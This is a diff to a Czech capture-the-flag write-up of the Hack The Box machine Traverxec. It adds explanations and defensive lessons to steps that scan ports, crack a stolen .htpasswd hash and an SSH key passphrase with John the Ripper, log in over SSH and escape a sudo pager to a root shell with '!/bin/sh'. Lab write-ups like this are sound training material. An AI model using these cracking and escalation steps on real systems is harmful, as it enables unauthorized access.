@@ -5,11 +5,19 @@ title: "Traverxec"
 date: 2021-01-27
 tags: ssh sudo exploit enumeration privesc hackthebox
 ---
-[Traverxec](https://www.hackthebox.eu/home/machines/profile/217) je stroj z Hack The Box. Cílem je přejít od prvotní enumerace až k plnému ovládnutí systému.
+
+## Úvod a kontext
+
+Traverxec je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -p 1-65535 -T4 -A -sC -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -p 1-65535 -T4 -A -sC -v $IP
+```
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
@@ -24,12 +32,20 @@ PORT   STATE SERVICE VERSION
 ```
 
 ### Vyhledání otevřených portů (2)
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -sU -T4 -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -sU -T4 -v $IP
+```
+
+## Analýza zjištění
 
 ### Lámání hesel nebo hashů
-Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
-`cat /var/nostromo/conf/.htpasswd`
+
+Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
+```bash
+cat /var/nostromo/conf/.htpasswd
+```
 ```
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 /usr/sbin/john Traverxec-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -43,13 +59,21 @@ http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
 => hunter
 ```
 
+## Získání přístupu
+
 ### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`ssh -i Traverxec-ssh/id_rsa david@10.10.10.165`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+ssh -i Traverxec-ssh/id_rsa david@10.10.10.165
+```
 
 ### Získání user flagu
-Tímto potvrzuji úspěšný uživatelský přístup.
-`cat user.txt`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+cat user.txt
+```
 ```
 __CENSORED__
 
@@ -59,9 +83,27 @@ změnšit okno aby výpis musel začít stránkovat
 !/bin/sh
 ```
 
+## Eskalace oprávnění
+
 ### Získání root flagu
-Tímto potvrzuji úplné ovládnutí stroje.
-`cat root.txt`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+cat root.txt
+```
 ```
 __CENSORED__
 ```
+
+## Shrnutí klíčových poznatků
+
+- Úvodní sken služeb vymezil reálnou útočnou plochu a pomohl oddělit relevantní stopy od šumu.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.
+
+## Co si odnést do praxe
+
+- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
+- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
